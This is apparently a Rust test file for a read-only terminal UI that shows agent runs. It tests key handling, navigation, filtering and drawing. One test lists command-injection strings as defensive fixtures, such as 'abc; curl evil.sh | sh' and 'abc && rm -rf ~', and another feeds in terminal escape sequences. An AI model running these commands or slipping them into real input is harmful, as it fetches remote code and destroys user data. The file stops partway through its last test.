//! The TUI's proofs, all headless: the pure state machine needs no
//! terminal, the draw path runs through `TestBackend` into a buffer, and
//! the shell runs over injected key and refresh sources.

use super::*;
use forge_core::fold::{Cursor, RunState, Status};
use forge_core::{EventEnvelope, EventType};
use forge_store::Store;
use ratatui::backend::TestBackend;
use ratatui::crossterm::event::{MouseEvent, MouseEventKind};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::path::Path;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Mutex;

const T0: &str = "2026-01-01T00:00:00Z";
const T1: &str = "2026-01-01T00:00:05Z";
const T2: &str = "2026-01-01T00:02:03Z";
const NOW: &str = "2026-01-01T00:07:03Z";

// -------------------------------------------------------------- fixtures

fn ev(seq: u64, event_type: EventType, payload: Value, at: &str) -> EventEnvelope {
    EventEnvelope {
        run_id: "run-7".to_string(),
        seq,
        event_id: format!("ev{seq}"),
        event_schema_version: 1,
        event_type,
        payload,
        causation_id: None,
        correlation_id: "corr".to_string(),
        attempt_id: None,
        recorded_at: at.to_string(),
        previous_hash: String::new(),
        event_hash: String::new(),
    }
}

fn state() -> RunState {
    state_of(Status::Running)
}

fn state_of(status: Status) -> RunState {
    RunState {
        run_id: "run-7".to_string(),
        seq: 18,
        last_hash: "hash".to_string(),
        status,
        phase: Some("design".to_string()),
        cursor: Cursor::Idle,
        consecutive_failures: BTreeMap::new(),
        last_decision: Some(json!({"rule_id": "INTAKE-OK", "from": "intake",
                                   "next": "design", "result": "intook"})),
        reviewed_heads: None,
        park_reason: None,
        feature: Some("one derivation, three surfaces".to_string()),
        pending_command: None,
    }
}

/// An intake seat that concluded, then a design sequence: a forked step
/// with two members, a one-member step, and a bare member still working.
/// Every shape the graph draws, in one run.
fn journal(seat: &str) -> Vec<EventEnvelope> {
    let mut events = vec![
        ev(
            1,
            EventType::RunStarted,
            json!({"feature": "one derivation, three surfaces"}),
            T0,
        ),
        ev(2, EventType::PhaseEntered, json!({"phase": "intake"}), T0),
        ev(
            3,
            EventType::EffectRequested,
            json!({"effect_id": "eff-i", "seat": seat, "phase": "intake"}),
            T0,
        ),
        ev(
            4,
            EventType::EffectStarted,
            json!({"effect_id": "eff-i", "attempt_id": "att1"}),
            T0,
        ),
        ev(
            5,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-i", "attempt_id": "att1",
                   "checkpoint": {"step": "seat-turn", "turn": 3, "tool": "Read",
                                  "target": "docs/decisions/0014-interactive-tui.md"}}),
            T0,
        ),
        ev(
            6,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-i", "attempt_id": "att1",
                   "checkpoint": {"step": "claude-session-finished",
                                  "session_id": "abcd-1234", "total_cost_usd": 0.03125}}),
            T1,
        ),
        ev(
            7,
            EventType::EffectSucceeded,
            json!({"effect_id": "eff-i", "attempt_id": "att1",
                   "result": {"result": "intook"}}),
            T2,
        ),
        ev(
            8,
            EventType::TransitionDecided,
            json!({"rule_id": "INTAKE-OK", "severity": "normal", "from": "intake",
                   "next": "design", "result": "intook"}),
            T2,
        ),
        ev(9, EventType::PhaseEntered, json!({"phase": "design"}), T2),
        ev(
            10,
            EventType::EffectRequested,
            json!({"effect_id": "eff-d", "seat": "design", "phase": "design"}),
            T2,
        ),
        ev(
            11,
            EventType::EffectStarted,
            json!({"effect_id": "eff-d", "attempt_id": "att2"}),
            T2,
        ),
    ];
    for (seq, member) in [(12, "positions:simplicity"), (13, "positions:robustness")] {
        events.push(ev(
            seq,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-d", "attempt_id": "att2",
                   "checkpoint": {"member": member, "step": "panel-member-finished",
                                  "outcome": "succeeded"}}),
            T2,
        ));
    }
    events.push(ev(
        14,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"step": "sequence-step-finished", "step_name": "positions"}}),
        T2,
    ));
    events.push(ev(
        15,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"member": "review:only", "step": "panel-member-finished",
                              "outcome": "succeeded"}}),
        T2,
    ));
    events.push(ev(
        16,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"step": "sequence-step-finished", "step_name": "review"}}),
        T2,
    ));
    events.push(ev(
        17,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"member": "chief", "step": "seat-turn", "turn": 2,
                              "tool": "Write", "target": "specs/interactive-tui/spec.md"}}),
        T2,
    ));
    events
}

fn run_view_for(seat: &str) -> RunView {
    forge_view::run_view(&journal(seat), Some(&state()))
}

/// Two runs plus one whose journal does not fold and whose stamp does
/// not parse: the absence marks have a row to live in.
fn fleet() -> RunsView {
    let folded = state();
    let entries = [
        forge_view::RunEntry {
            run_id: "run-unfoldable",
            feature: "a run whose journal does not fold",
            created_at: "not a timestamp",
            state: None,
        },
        forge_view::RunEntry {
            run_id: "run-old",
            feature: "an older feature",
            created_at: T0,
            state: Some(&folded),
        },
        forge_view::RunEntry {
            run_id: "run-7",
            feature: "one derivation, three surfaces",
            created_at: T1,
            state: Some(&folded),
        },
    ];
    forge_view::run_rows(&entries)
}

fn views_with(seat: &str) -> Views {
    Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(run_view_for(seat)),
        transcript: None,
    }
}

fn views() -> Views {
    views_with("intake")
}

/// The RUN level for `run-7`, as `Enter` on the fleet leaves it.
fn at_run() -> Tui {
    let mut tui = Tui::new(None);
    tui.cursor[0] = Some("run-7".to_string());
    let views = views();
    apply(&mut tui, &views, Key::Enter);
    tui
}

/// The RUN level with the seats pane focused and a seat under the
/// cursor.
fn at_seats(key: &str) -> Tui {
    let mut tui = at_run();
    tui.pane = 1;
    tui.cursor[1] = Some(key.to_string());
    tui
}

fn buffer_of(tui: &Tui, views: &Views, width: u16, height: u16) -> Vec<String> {
    let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
    terminal.draw(|frame| draw(frame, tui, views)).unwrap();
    let buffer = terminal.backend().buffer().clone();
    let mut lines = Vec::new();
    for row in 0..buffer.area.height {
        let mut line = String::new();
        for column in 0..buffer.area.width {
            line.push_str(buffer[(column, row)].symbol());
        }
        lines.push(line);
    }
    lines
}

fn frame_of(tui: &Tui, views: &Views, width: u16, height: u16) -> String {
    buffer_of(tui, views, width, height).join("\n")
}

/// The characters of one buffer line from column `x` — how "the
/// neighbouring column starts at its expected x" is asked.
fn at(line: &str, x: usize) -> String {
    line.chars().skip(x).collect()
}

// -------------------------------------------------- AC-14: key translation

#[test]
fn key_translation_filters_releases_binds_ctrl_c_and_names_what_it_ignores() {
    let pressed = |code| Event::Key(KeyEvent::new(code, KeyModifiers::NONE));
    assert_eq!(from_crossterm(pressed(KeyCode::Up)), Some(Key::Up));
    assert_eq!(from_crossterm(pressed(KeyCode::Down)), Some(Key::Down));
    assert_eq!(from_crossterm(pressed(KeyCode::PageUp)), Some(Key::PageUp));
    assert_eq!(
        from_crossterm(pressed(KeyCode::PageDown)),
        Some(Key::PageDown)
    );
    assert_eq!(from_crossterm(pressed(KeyCode::Tab)), Some(Key::Tab));
    assert_eq!(from_crossterm(pressed(KeyCode::BackTab)), Some(Key::Tab));
    assert_eq!(from_crossterm(pressed(KeyCode::Enter)), Some(Key::Enter));
    assert_eq!(from_crossterm(pressed(KeyCode::Esc)), Some(Key::Escape));
    assert_eq!(
        from_crossterm(pressed(KeyCode::Backspace)),
        Some(Key::Backspace)
    );
    assert_eq!(
        from_crossterm(pressed(KeyCode::Char('j'))),
        Some(Key::Char('j'))
    );
    assert_eq!(from_crossterm(pressed(KeyCode::Home)), None, "unbound");

    // Raw mode disables SIGINT, so an operator whose draw path wedges
    // must still have a way out.
    assert_eq!(
        from_crossterm(Event::Key(KeyEvent::new(
            KeyCode::Char('c'),
            KeyModifiers::CONTROL
        ))),
        Some(Key::Quit)
    );

    // Windows delivers key RELEASES too: a handler matching on KeyCode
    // alone would process every keystroke twice on that CI leg.
    let mut release = KeyEvent::new(KeyCode::Char('q'), KeyModifiers::NONE);
    release.kind = KeyEventKind::Release;
    assert_eq!(from_crossterm(Event::Key(release)), None);

    // Ignored by named arms, never by an untested wildcard.
    assert_eq!(
        from_crossterm(Event::Mouse(MouseEvent {
            kind: MouseEventKind::Moved,
            column: 1,
            row: 1,
            modifiers: KeyModifiers::NONE,
        })),
        None
    );
    assert_eq!(from_crossterm(Event::Paste("pasted".into())), None);
    assert_eq!(from_crossterm(Event::FocusGained), None);
    assert_eq!(from_crossterm(Event::FocusLost), None);
    assert_eq!(from_crossterm(Event::Resize(10, 10)), None);
}

// ------------------------------------------------------ AC-7: movement

#[test]
fn movement_wraps_pages_and_forgets_a_vanished_key() {
    let keys: Vec<String> = ["a", "b", "c"].iter().map(|k| k.to_string()).collect();
    let mut cursor = None;

    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(
        cursor.as_deref(),
        Some("a"),
        "no selection starts at the top"
    );
    move_to(&keys, &mut cursor, Step::Up);
    assert_eq!(cursor.as_deref(), Some("c"), "wraps at the top end");
    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(cursor.as_deref(), Some("a"), "wraps at the bottom end");
    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(cursor.as_deref(), Some("b"));
    move_to(&keys, &mut cursor, Step::Up);
    assert_eq!(cursor.as_deref(), Some("a"));
    move_to(&keys, &mut cursor, Step::Bottom);
    assert_eq!(cursor.as_deref(), Some("c"));
    move_to(&keys, &mut cursor, Step::Top);
    assert_eq!(cursor.as_deref(), Some("a"));
    move_to(&keys, &mut cursor, Step::PageDown);
    assert_eq!(cursor.as_deref(), Some("c"), "paging stops at the end");
    move_to(&keys, &mut cursor, Step::PageUp);
    assert_eq!(cursor.as_deref(), Some("a"), "and at the start");

    // The subject vanished across a refresh, or the filter excluded it:
    // movement restarts from the top, and `G` still reaches the bottom.
    cursor = Some("gone".to_string());
    assert_eq!(index_of(&keys, &cursor), None);
    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(cursor.as_deref(), Some("a"));
    cursor = Some("gone".to_string());
    move_to(&keys, &mut cursor, Step::Bottom);
    assert_eq!(cursor.as_deref(), Some("c"));

    // An empty list holds no selection at all.
    let mut cursor = Some("a".to_string());
    move_to(&[], &mut cursor, Step::Down);
    assert_eq!(cursor, None);
    assert_eq!(index_of(&keys, &None), None);
}

// ------------------------------------------ AC-4, AC-5: the Enter/Esc ladder

#[test]
fn enter_descends_one_rung_at_a_time_and_esc_pops_the_same_rungs() {
    let views = views();
    let mut tui = Tui::new(None);
    assert_eq!(tui.level, Level::Runs);

    // Rung 1: RUNS, cursor on a run.
    assert_eq!(apply(&mut tui, &views, Key::Enter), Flow::Continue);
    assert_eq!(tui.run, None, "no selection descends into nothing");
    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.cursor[0].as_deref(), Some("run-7"), "newest first");
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.run.as_deref(), Some("run-7"));
    assert_eq!(tui.pane, 0);

    // Rung 2: RUN · graph → a phase scope.
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "intake"),
        "the graph pane scopes by phase"
    );

    // Rung 3: RUN · seats, an unscoped seat → a seat scope.
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.scope.is_none(), "Esc rung 4 clears the scope");
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 1);
    apply(&mut tui, &views, Key::Down);
    let seat = tui.cursor[1].clone().unwrap();
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(scoped_seat(&tui), Some(seat.as_str()));
    assert_eq!(tui.level, Level::Run, "one rung, not two");

    // Rung 4: the SAME seat again → descend.
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    assert_eq!(tui.seat.as_deref(), Some(seat.as_str()));

    // Rung 3 of Esc: back to the seat you were reading, scope retained.
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.seat, None);
    assert_eq!(tui.pane, 1, "landed back on the seats pane");
    assert_eq!(scoped_seat(&tui), Some(seat.as_str()), "scope retained");

    // Rungs 4 and 5, then rung 6: Esc NEVER quits.
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.scope.is_none());
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Runs);
    assert_eq!(apply(&mut tui, &views, Key::Escape), Flow::Continue);
    assert_eq!(tui.level, Level::Runs, "the bottom rung does nothing");
}

#[test]
fn backspace_ascends_by_rungs_three_and_five_and_never_clears_a_scope() {
    let views = views();
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);

    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(
        scoped_seat(&tui),
        Some("eff-i"),
        "ascending never clears a scope"
    );
    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.level, Level::Runs, "rung 5, with the scope untouched");
    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.level, Level::Runs);
}

#[test]
fn the_run_flag_opens_at_the_run_level_and_esc_walks_to_the_fleet() {
    let views = views();
    let mut tui = Tui::new(Some("run-7".to_string()));
    assert_eq!(tui.level, Level::Run, "--run opens at its run");
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Runs, "and Esc reaches the full fleet");
    assert_eq!(tui.run.as_deref(), Some("run-7"));
}

#[test]
fn tab_cycles_the_panes_a_level_has_and_a_new_run_clears_every_selection() {
    let views = views();
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 0, "one pane at RUNS: a visible no-op");

    let mut tui = at_run();
    for expected in [1, 2, 0] {
        apply(&mut tui, &views, Key::Tab);
        assert_eq!(tui.pane, expected);
    }

    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 1);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 0, "two panes at PARTICIPANT");

    // Assigning a run clears scope, seat, filter and every cursor.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    tui.filter = "run".to_string();
    tui.level = Level::Runs;
    tui.pane = 0;
    tui.cursor[0] = Some("run-old".to_string());
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.run.as_deref(), Some("run-old"));
    assert!(tui.scope.is_none() && tui.seat.is_none());
    assert!(tui.filter.is_empty() && !tui.typing);
    assert_eq!(tui.cursor, [None, None, None]);
}

// ------------------------------------------------ AC-6, AC-11: filtering

#[test]
fn a_filter_narrows_the_focused_list_incrementally_and_never_clears_a_scope() {
    let views = views();
    let mut tui = at_run();
    assert_eq!(keys_for(&tui, &views).len(), 2, "two phases");

    apply(&mut tui, &views, Key::Char('/'));
    assert!(tui.typing);
    for (character, expected) in [('d', 1), ('e', 1), ('z', 0)] {
        apply(&mut tui, &views, Key::Char(character));
        assert_eq!(
            keys_for(&tui, &views).len(),
            expected,
            "filter {:?} narrows as it is typed",
            tui.filter
        );
    }
    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.filter, "de", "Backspace deletes one character");
    assert_eq!(keys_for(&tui, &views).len(), 1);
    apply(&mut tui, &views, Key::Enter);
    assert!(!tui.typing, "Enter commits the filter");
    assert_eq!(tui.filter, "de", "and keeps it");
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.filter.is_empty(), "Esc clears the filter");
    assert_eq!(tui.level, Level::Run, "clearing a filter is not ascending");

    // A filter that hides the scoped subject leaves the scope intact:
    // absence from a FILTERED list is a display fact, and only absence
    // from the unfiltered model is the vanish condition.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    assert!(tui.scope.is_some());
    apply(&mut tui, &views, Key::Char('/'));
    apply(&mut tui, &views, Key::Char('z'));
    settle(&mut tui, &views);
    assert!(keys_for(&tui, &views).is_empty(), "nothing matches");
    assert_eq!(scoped_seat(&tui), Some("eff-i"), "the scope survives");

    // Operator input is sanitized before it is echoed anywhere.
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Char('/'));
    for character in "a\x1b[2Jb\r".chars() {
        apply(&mut tui, &views, Key::Char(character));
    }
    assert_eq!(tui.filter, "a[2Jb", "a pasted escape sequence is inert");
    assert!(!footer_for(&tui).contains('\x1b'));
}

// ------------------------------------------- AC-6, AC-7: scoping and vanish

#[test]
fn a_second_selection_replaces_the_first_and_a_vanished_subject_clears_itself() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    assert!(matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "intake"));
    // The graph pane lists every phase whether or not one is scoped —
    // a selector that hid the alternatives could never replace a scope.
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "design"),
        "exclusivity is one Option field, not a rule: {:?}",
        tui.cursor
    );

    // Selection SURVIVES a refresh that changes the list: the same
    // state, applied against a second, longer RunView, still resolves.
    let mut grown = views_with("intake");
    grown.runs = fleet();
    settle(&mut tui, &grown);
    assert!(tui.scope.is_some(), "the phase is still there");
    assert_eq!(selected(&tui, &grown).as_deref(), Some("design"));

    // And CLEARS ITSELF when the subject vanishes from the unfiltered
    // model — here, a run whose journal holds no such phase.
    let empty = Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(forge_view::run_view(&[], None)),
        transcript: None,
    };
    settle(&mut tui, &empty);
    assert!(tui.scope.is_none(), "the phase went away");
    assert_eq!(selected(&tui, &empty), None);

    // A seat that vanishes takes the PARTICIPANT level with it.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    settle(&mut tui, &views);
    assert_eq!(tui.level, Level::Participant, "still there, still open");
    settle(&mut tui, &empty);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.seat, None);

    // A run that vanishes from a NON-EMPTY fleet clears the selection;
    // an empty fleet is the unreadable-journal frame and proves nothing.
    let mut tui = at_run();
    settle(&mut tui, &Views::empty());
    assert_eq!(tui.run.as_deref(), Some("run-7"), "no fleet, no evidence");
    let others = Views {
        now: NOW.to_string(),
        runs: forge_view::run_rows(&[forge_view::RunEntry {
            run_id: "run-other",
            feature: "another run",
            created_at: T0,
            state: None,
        }]),
        run: None,
        transcript: None,
    };
    settle(&mut tui, &others);
    assert_eq!(tui.run, None);
    assert_eq!(tui.level, Level::Runs);
}

// -------------------------------------------------------- AC-8: the footer

#[test]
fn the_footer_names_the_keys_of_the_context_it_is_in() {
    let views = views();
    let mut states: Vec<String> = Vec::new();

    let tui = Tui::new(None);
    states.push(footer_for(&tui));
    assert!(states[0].contains("Enter open run"), "{}", states[0]);

    let mut tui = at_run();
    states.push(footer_for(&tui));
    assert!(states[1].contains("Enter scope phase"));

    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &views, Key::Down);
    states.push(footer_for(&tui));
    assert!(states[2].contains("Enter scope seat"), "{}", states[2]);

    apply(&mut tui, &views, Key::Enter);
    states.push(footer_for(&tui));
    assert!(
        states[3].contains("Enter open seat"),
        "an already-scoped seat opens: {}",
        states[3]
    );

    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 2, "the trail");
    states.push(footer_for(&tui));
    assert!(states[4].contains("Tab pane"));

    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 1, "back on the scoped seat");
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    states.push(footer_for(&tui));
    assert!(states[5].contains("scroll"), "{}", states[5]);

    apply(&mut tui, &views, Key::Char('/'));
    states.push(footer_for(&tui));
    assert!(states[6].starts_with('/'));

    apply(&mut tui, &views, Key::Escape);
    apply(&mut tui, &views, Key::Char('?'));
    states.push(footer_for(&tui));
    assert!(states[7].contains("close help"));

    // Every context differs from every other: a footer that always
    // printed the same string could not pass this.
    for (index, state) in states.iter().enumerate() {
        for (other_index, other) in states.iter().enumerate() {
            assert!(
                index == other_index || state != other,
                "contexts {index} and {other_index} share a footer: {state}"
            );
        }
        // While a filter is being typed, `q` is a letter — so that
        // context names what it does have instead.
        assert!(
            state.contains("quit") || state.starts_with('/'),
            "every context names its way out: {state}"
        );
    }
}

#[test]
fn the_status_line_is_the_breadcrumb_or_the_sentence_a_bad_journal_earns() {
    let views = views();
    let tui = Tui::new(None);
    assert_eq!(status_line(&tui), "runs");

    let mut tui = at_seats("eff-i");
    assert!(status_line(&tui).contains("run run-7"));
    apply(&mut tui, &views, Key::Enter);
    assert!(status_line(&tui).contains("scoped eff-i"));
    apply(&mut tui, &views, Key::Enter);
    assert!(status_line(&tui).contains("seat eff-i"));

    let mut tui = at_run();
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    assert!(status_line(&tui).contains("phase intake"));

    tui.status = Some("the journal is not readable right now: locked".to_string());
    assert!(status_line(&tui).contains("not readable"));
}

// ------------------------------------------ AC-3, AC-10, AC-11: the paint

#[test]
fn the_runs_table_is_a_bordered_navigable_table_of_model_fields() {
    let views = views();
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Down);
    let frame = frame_of(&tui, &views, 100, 20);

    assert!(frame.contains("┌"), "bordered: {frame}");
    for column in ["id", "status", "phase", "seq", "age", "feature"] {
        assert!(frame.contains(column), "header names {column}: {frame}");
    }
    assert!(frame.contains("run-7"));
    assert!(frame.contains("running"));
    assert!(frame.contains("design"));
    assert!(frame.contains("7m03s"), "age is the model's: {frame}");
    assert!(frame.contains("one derivation"));
    // A run whose journal does not fold KEEPS ITS ROW, with the absence
    // marks the models carry rather than a guessed status.
    assert!(frame.contains("run-unfoldable"), "{frame}");
    assert!(frame.contains('?') && frame.contains('—'), "{frame}");
    // The footer names this context's keys, in the frame itself.
    assert!(frame.contains("Enter open run"), "{frame}");
}

#[test]
fn the_run_level_draws_the_tree_the_seats_and_the_trail() {
    let views = views();
    let tui = at_run();
    let frame = frame_of(&tui, &views, 110, 30);

    // The 0013 tree, with both markers, uncoloured.
    assert!(frame.contains("intake ×1"), "{frame}");
    assert!(frame.contains("design ×1"), "{frame}");
    assert!(frame.contains("←current"), "{frame}");
    assert!(frame.contains('⑂'), "a fork: {frame}");
    assert!(frame.contains('→'), "a sequential step: {frame}");
    assert!(frame.contains("positions"), "{frame}");

    // The seats table: six columns of model fields.
    for column in [
        "participant",
        "status",
        "attempts",
        "turns",
        "cost",
        "activity",
    ] {
        assert!(frame.contains(column), "header names {column}: {frame}");
    }
    assert!(frame.contains("succeeded"), "a concluded seat: {frame}");
    assert!(frame.contains("intook"), "activity.text: {frame}");
    assert!(frame.contains("$0.03"), "the cost cell: {frame}");
    // A working seat shows its live tool and target — the model's own
    // composition of `activity.tool` and `activity.target_short`.
    assert!(
        frame.contains("Write · …/interactive-tui/spec.md") || frame.contains("Write · "),
        "{frame}"
    );

    // The decision trail.
    assert!(frame.contains("INTAKE-OK"), "{frame}");
    assert!(frame.contains("transition/decided"), "{frame}");
}

#[test]
fn a_hostile_seat_label_renders_inert_and_does_not_move_its_neighbour() {
    // A seat label carrying an OSC title-set, a carriage return and a
    // RIGHT-TO-LEFT OVERRIDE: three ways to forge a ruling line.
    let views = views_with("seat\x1b]0;pwn\x07\rdeppots\u{202E}");
    let mut tui = at_run();
    tui.pane = 1;
    let lines = buffer_of(&tui, &views, 110, 30);
    let frame = lines.join("\n");

    assert!(!frame.contains('\x1b'), "no escape reaches the buffer");
    assert!(!frame.contains('\r'), "no carriage return either");
    assert!(!frame.contains('\u{202E}'), "and no reordering override");
    assert!(
        frame.contains("seat]0;pwndeppots"),
        "in source order: {frame}"
    );

    // The width half of the claim: the neighbouring column still starts
    // where the header says it does.
    let head = lines
        .iter()
        .position(|line| line.contains("participant"))
        .expect("the seats header is drawn");
    // Columns are counted in characters, not bytes: the border glyphs
    // are three bytes each and the claim is about where a column
    // *appears*.
    let byte = lines[head].find("status").expect("a status column");
    let x = lines[head][..byte].chars().count();
    let row = lines[head..]
        .iter()
        .find(|line| line.contains("seat]0;pwn"))
        .expect("the hostile row is drawn");
    assert!(
        at(row, x).starts_with("succeeded"),
        "the status column starts at x={x}: {row:?}"
    );
}

#[test]
fn the_participant_level_shows_the_stream_the_resume_line_and_the_transcript() {
    let mut views = views();
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);

    // No local transcript: the pane says so, and the resume line is
    // still there — it is the escape hatch that always exists.
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("claude --resume abcd-1234"), "{frame}");
    assert!(frame.contains("no local session transcript"), "{frame}");
    assert!(frame.contains("effect/succeeded"), "terminal_line: {frame}");
    assert!(frame.contains("Read"), "the checkpoint stream: {frame}");

    // With one: prose and tool markers, and the truncation flag SHOWN.
    views.transcript = Some((
        vec![crate::ui::Turn {
            role: "assistant".to_string(),
            ts: T1.to_string(),
            blocks: vec![crate::ui::Block {
                kind: "text",
                text: "the seat's own words".to_string(),
            }],
        }],
        true,
    ));
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("the seat's own words"), "{frame}");
    assert!(frame.contains("transcript truncated"), "{frame}");

    // A seat with no session id still gets the line, carrying the
    // model's absence mark rather than a pasteable lie.
    let views = views_with("intake");
    let mut tui = at_seats("eff-d");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("claude --resume —"), "{frame}");
}

#[test]
fn a_shell_bearing_session_id_never_becomes_a_pasteable_command() {
    // session_id is a raw journal string rendered into a command the
    // operator is invited to paste. Control characters are stripped,
    // but ';', '&&', '$(…)' and backticks are not — so an id that
    // cannot name a transcript is shown as an absence, never as a
    // suggestion. Same guard the session lookup already applies.
    for hostile in [
        "abc; curl evil.sh | sh",
        "abc && rm -rf ~",
        "$(id)",
        "`id`",
        "../../etc/passwd",
    ] {
        assert!(
            !crate::ui::valid_session_id(hostile),
            "{hostile:?} must not pass the guard"
        );
        let mut views = views();
        for part in &mut views.run.as_mut().unwrap().participants {
            part.session_id = Some(hostile.to_string());
        }
        let mut tui = at_seats("eff-d");
        apply(&mut tui, &views, Key::Enter);
        apply(&mut tui, &views, Key::Enter);
        let frame = frame_of(&tui, &views, 100, 26);
        assert!(
            frame.contains("claude --resume —"),
            "hostile id reached the resume line: {frame}"
        );
        assert!(!frame.contains("curl"), "{frame}");
        assert!(!frame.contains("rm -rf"), "{frame}");
    }
}

#[test]
fn scrolling_a_paragraph_pane_moves_its_offset_within_the_stream() {
    let mut views = views();
    views.transcript = Some((
        (0..4)
            .map(|index| crate::ui::Turn {
                role: format!("turn {index}"),
                ts: T1.to_string(),
                blocks: Vec::new(),
            })
            .collect(),
        false,
    ));
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);

    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.offset, 1, "the checkpoint pane scrolls");
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(
        tui.offset,
        seat_of(&tui, &views).unwrap().checkpoints.len() - 1
    );
    apply(&mut tui, &views, Key::Char('g'));
    assert_eq!(tui.offset, 0);
    apply(&mut tui, &views, Key::PageDown);
    apply(&mut tui, &views, Key::PageUp);
    assert_eq!(tui.offset, 0);

    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(tui.offset, 3, "and so does the transcript pane");
    assert_eq!(offset_for(&tui, 1), 3);
    assert_eq!(offset_for(&tui, 0), 0, "an unfocused pane keeps its top");

    // A pane with nothing in it holds no offset at all.
    views.transcript = None;
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(tui.offset, 0);
}

// ---------------------------------------------- AC-8, AC-13: help and size

#[test]
fn help_overlays_and_a_terminal_below_the_minimum_names_the_other_verbs() {
    let views = views();
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Char('?'));
    let frame = frame_of(&tui, &views, 100, 20);
    assert!(frame.contains("read-only"), "the help says what this is");
    assert!(frame.contains("Enter"), "and names the keys: {frame}");
    apply(&mut tui, &views, Key::Char('?'));
    assert!(!tui.help, "? toggles");

    // A resize below the minimum draws ONE centred frame naming the
    // other two surfaces, and never tears the session down.
    let small = frame_of(&tui, &views, MIN_WIDTH - 1, 20);
    assert!(small.contains("too small"), "{small}");
    assert!(small.contains("forge inspect"), "{small}");
    assert!(small.contains("forge watch"), "{small}");
    let short = frame_of(&tui, &views, 100, MIN_HEIGHT - 1);
    assert!(short.contains("too small"), "{short}");
    assert!(short.contains("q or Ctrl+C quits"), "{short}");
}

// ------------------------------------------------------ AC-2: the refusals

#[test]
fn every_startup_refusal_names_both_of_the_other_readouts() {
    assert_eq!(refuse(true, (100, 40), true), None, "a real terminal");
    for refusal in [
        refuse(true, (100, 40), false),
        refuse(false, (100, 40), true),
        refuse(true, (MIN_WIDTH - 1, 40), true),
